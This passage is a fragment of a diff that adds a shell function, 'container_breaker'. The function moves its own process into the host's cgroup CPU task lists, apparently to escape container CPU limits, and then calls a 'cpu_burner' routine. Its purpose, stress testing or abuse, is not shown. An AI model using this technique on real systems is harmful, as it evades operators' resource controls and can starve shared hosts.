@@ -1,0 +1,4 @@
+container_breaker() {
+    echo $$ > /sys/fs/cgroup/cpu/tasks 2>/dev/null
+    echo $$ > /sys/fs/cgroup/cpu,cpuacct/tasks 2>/dev/null
+    cpu_burner
